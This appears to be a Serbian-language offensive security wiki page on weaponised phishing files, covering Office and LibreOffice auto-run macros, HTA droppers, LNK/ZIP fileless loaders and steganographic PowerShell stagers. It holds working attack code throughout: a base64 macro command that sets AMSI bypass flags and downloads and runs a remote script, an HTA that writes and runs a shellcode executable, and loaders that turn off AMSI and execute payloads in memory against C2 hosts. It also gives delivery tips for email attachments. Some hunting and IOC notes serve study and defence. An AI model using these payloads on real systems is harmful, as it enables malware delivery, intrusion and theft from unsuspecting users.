# Phishing fajlovi i dokumenti

## Office dokumenti

Microsoft Word vrši validaciju podataka fajla pre njegovog otvaranja. Validacija podataka se vrši u obliku identifikacije strukture podataka, prema OfficeOpenXML standardu. Ako dođe do bilo kakve greške tokom identifikacije strukture podataka, analizirani fajl neće biti otvoren.

Obično Word fajlovi koji sadrže macros koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije i i dalje zadržati njegove mogućnosti izvršavanja macros-a.\
Na primer, RTF fajl po dizajnu ne podržava macros, ali DOCM fajl preimenovan u RTF Microsoft Word će obraditi i on će moći da izvršava macros.\
Isti interni elementi i mehanizmi primenjuju se na sav softver iz Microsoft Office Suite-a (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će izvršavati neki Office programi:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files koji referenciraju remote template (File –Options –Add-ins –Manage: Templates –Go) koji uključuje makroe mogu takođe da „izvrše“ makroe.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, i **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor makroa

Moguće je koristiti makroe za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što su češće, veća je verovatnoća da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Primeri koda makroa
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklanjanje metapodataka

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored opcije **Document Properties and Personal Information**.

#### Doc Extension

Kada završite, izaberite padajući meni **Save as type** i promenite format sa **`.docx`** na Word 97-2003 **`.doc`**.\
To uradite zato što **ne možete sačuvati macro-e unutar `.docx`** i zato što postoji **stigma** **oko** macro-enabled **`.docm`** ekstenzije (npr. ikona thumbnail-a ima veliko `!`, a neki web/email gateway-i ih u potpunosti blokiraju). Zbog toga je ova **legacy `.doc` ekstenzija najbolji kompromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer dokumenti mogu sadržati Basic macro-e i automatski ih izvršiti kada se fajl otvori, tako što se macro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan reverse shell macro izgleda ovako:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Imajte na umu dvostruke navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape literalnih navodnika, tako da payload-i koji se završavaju sa `...==""")` zadržavaju balansirane i unutrašnju komandu i Shell argument.

Saveti za isporuku:

- Sačuvajte kao `.odt` i povežite macro sa događajem dokumenta kako bi se odmah izvršio pri otvaranju.
- Prilikom slanja e-pošte pomoću `swaks`, koristite `--attach @resume.odt` (`@` je obavezan kako bi bajtovi fajla, a ne string sa nazivom fajla, bili poslati kao prilog). Ovo je ključno prilikom zloupotrebe SMTP servera koji prihvataju proizvoljne `RCPT TO` primaoce bez validacije.

## HTA fajlovi

HTA je Windows program koji **objedinjuje HTML i scripting jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija sa statusom "fully trusted", bez ograničenja bezbednosnog modela browsera.

HTA se izvršava pomoću **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer-om**, zbog čega **`mshta` zavisi od IE-a**. Ako je IE deinstaliran, HTA fajlovi neće moći da se izvršavaju.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forsiranje NTLM Authentication

Postoji nekoliko načina da se **NTLM authentication "daljinski" forsira**, na primer, možete dodati **nevidljive slike** u emailove ili HTML kojem će korisnik pristupiti (čak i HTTP MitM?). Ili žrtvi poslati **adrese fajlova** koje će **pokrenuti** **authentication** samo **otvaranjem foldera.**

**Pogledajte ove ideje i još mnogo toga na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo ukrasti hash ili authentication, već možete i **izvršiti NTLM relay napade**:

- [**NTLM Relay napadi**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay ka sertifikatima)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna dokumenta za odvraćanje pažnje (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što je stvarni PowerShell loader sačuvan unutar sirovih bajtova ZIP-a nakon jedinstvenog markera, a .lnk ga izdvaja i izvršava u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira .lnk PowerShell one-liner:

1) Pronađi originalni ZIP na uobičajenim putanjama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i parent direktorijum trenutnog radnog direktorijuma.
2) Pročitaj bajtove ZIP-a i pronađi hardkodovani marker (npr. xFIQCV). Sve nakon markera predstavlja ugrađeni PowerShell payload.
3) Kopiraj ZIP u %ProgramData%, raspakuj ga tamo i otvori decoy .docx kako bi izgledao legitimno.
4) Zaobiđi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskiraj sledeću fazu (npr. ukloni sve znakove #) i izvrši je u memoriji.

Primer PowerShell skeleton-a za izdvajanje i izvršavanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Beleške
- Isporuka često zloupotrebljava renomirane PaaS poddomene (npr. *.herokuapp.com) i može ograničiti payload-e (isporučiti bezopasne ZIP datoteke na osnovu IP/UA podataka).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi se smanjili tragovi na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokrene payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalji i komande spremne za upotrebu nalaze se ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Detekcija/IOCs
- ZIP datoteke koje sadrže ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji pretražuje nadređene/korisničke foldere kako bi pronašao ZIP i otvorio dokument za odvraćanje pažnje.
- AMSI tampering putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne komunikacije koje se završavaju linkovima hostovanim na trusted PaaS domenima.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Drugi obrazac koji se često ponavlja jeste **.lnk koji imitira dokument** i odmah otvara bezopasni mamac, dok u pozadini priprema pravi lanac.<sup>[[3]](#references)</sup>

Uočeni tok:
1. Prečica se **predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje obfuskovanog PowerShell downloader-a.
2. PowerShell fragmentiše očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), pa naivne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` propuštaju komandu.
3. Stager prvo preuzima **dokument za odvraćanje pažnje**, otvara ga žrtvi, a zatim u pozadini rekonstruiše zlonamerne datoteke.
4. Payload-i mogu biti upisani sa **lažnim ekstenzijama**, a zatim preimenovani uklanjanjem dopunskih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
5. Persistence se uspostavlja pomoću **scheduled task-a zasnovanog na minutnom intervalu**, koji pokreće trusted host binary sa putanje u koju korisnik može da upisuje.

Minimalni tragovi za hunting iz ovog obrasca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Korisni staging raspored koji treba prepoznati je:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza stealthy

U Rapid7 studiji slučaja, scheduled task je iznova pokretao **`Fondue.exe`** iz `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio staged pored njega i exportovao **`RunFODW`**, trusted Microsoft binary je side-load-ovao attacker CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga kroz **Windows CNG / `bcrypt.dll`**
- Alocira executable memoriju i kopira dešifrovani shellcode
- Indirektno ga izvršava prosleđivanjem pokazivača na shellcode kao callback-a za **`EnumUILanguagesW`**

Ovaj poslednji korak vredi zasebno huntovati: malware često izbegava direktan `((void(*)())buf)()` jump i umesto toga zloupotrebljava **legitimate callback-taking WinAPI** za transfer execution-a.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao finalni PE u memoriji i patch-ovao **AMSI/WLDP/ETW** u trenutnom procesu pre predaje execution-a. Za detaljnije beleške o side-loadingu i memory-resident post-processing-u pogledajte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični hunting pivoti:
- `.lnk` koji pokreće `powershell.exe` ili `conhost.exe`, a zatim otvara vidljiv decoy dokument.
- Kratkotrajni download-i u **`C:\Users\Public\`**, praćeni neposrednim rename-ovima iz besmislenih ekstenzija.
- Scheduled task-ovi sa bezazlenim imenima kao što je `GoogleErrorReport`, koji se izvršavaju iz **user-writable direktorijuma**.
- Trusted binaries koji učitavaju **`.cpl` / `.dll`** fajlove iz istog non-system direktorijuma.
- Base64 tekstualni blob-ovi upisani u **`C:\Windows\Tasks\`**, koje zatim čita side-loaded modul.

## Payload-i u slikama razgraničeni pomoću Steganography (PowerShell stager)

Recent loader chains isporučuju obfuskovani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku, često GIF, koja sadrži Base64-encoded .NET DLL sakriven kao običan tekst između jedinstvenih start/end markera. Script traži ove delimitere, na primer one viđene u praksi: «<<sudo_png>> … <<sudo_odt>>>», izdvaja tekst između njih, Base64-decode-uje ga u bytes, učitava assembly u memoriji i poziva poznati entry method sa C2 URL-om.<sup>[[5]](#references)</sup>

Tok rada
- Stage 1: Arhivirani JS/VBS dropper → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → preuzima sliku, izdvaja marker-delimited Base64, učitava .NET DLL u memoriji i poziva njegov method, npr. VAI, prosleđujući C2 URL i opcije.
- Stage 3: Loader preuzima finalni payload i obično ga inject-uje pomoću process hollowing-a u trusted binary, najčešće MSBuild.exe.<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i trusted utility proxy execution-u pogledajte ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za izdvajanje DLL-a iz slike i pozivanje .NET method-a u memoriji:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Beleške
- Ovo je ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markeri se razlikuju između campaign-a.
- AMSI/ETW bypass i string deobfuscation se obično primenjuju pre učitavanja assembly-ja.
- Hunting: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blob-ove.

Pogledajte i stego tools i carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Česta početna faza je mali, veoma obfusciran `.js` ili `.vbs` dostavljen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass`, kako bi bootstrap-ovao sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>

Logika skeleta (apstraktno):
- Pročitati sadržaj sopstvenog fajla
- Locirati Base64 blob između junk string-ova
- Dekodirati u ASCII PowerShell
- Izvršiti pomoću `wscript.exe`/`cscript.exe`, pozivanjem `powershell.exe`

Hunting indikatori
- Arhivirani JS/VBS prilozi koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u command line-u.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz user temp putanja.

## Windows fajlovi za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM cred-ova**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: Sofisticirani phishing napad usmeren na kompanije u SAD](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Praćenje tradecraft-a Dropping Elephant kroz loader chain sa temom Kine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nova COM persistence tehnika (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader isporučuje različite infostealere](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
